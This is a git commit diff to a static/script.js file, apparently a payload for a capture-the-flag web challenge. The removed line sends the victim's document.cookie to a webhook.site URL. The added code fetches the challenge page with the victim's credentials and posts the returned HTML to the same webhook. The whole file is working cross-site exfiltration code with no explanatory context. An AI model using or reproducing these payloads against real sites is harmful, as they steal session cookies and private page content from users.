61bd681ae3f0c380c5c66a3b3e6098034e767820
iris-chieh <146847095+iris-chieh@users.noreply.github.com>
2025-04-08 14:48:19 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,11 @@
-new Image().src = "https://webhook.site/45b7f639-1bad-4e43-add9-ab366290349a?c=" + document.cookie;
+fetch("https://chall.nckuctf.org:28127/", {
+  credentials: "include"
+})
+  .then(res => res.text())
+  .then(html => {
+    fetch("https://webhook.site/45b7f639-1bad-4e43-add9-ab366290349a", {
+      method: "POST",
+      mode: "no-cors",
+      body: html
+    });
+  });
